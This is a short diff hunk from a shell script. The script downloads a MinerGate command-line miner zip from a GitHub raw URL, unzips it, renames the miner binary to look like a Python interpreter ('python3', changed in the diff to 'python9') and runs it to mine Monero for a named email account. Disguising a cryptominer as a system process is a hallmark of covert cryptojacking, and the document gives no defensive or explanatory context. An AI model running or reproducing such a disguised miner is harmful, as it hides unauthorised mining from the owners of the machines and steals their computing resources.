@@ -29,5 +29,5 @@ fi
 https://raw.githubusercontent.com/haidanglx/Tonghop/master/minergate-cli.zip
 unzip minergate-cli.zip
 cd minergate-cli
-mv minergate-cli python3
+mv minergate-cli python9
 ./python9 -u haidang.tli@gmail.com --xmr 
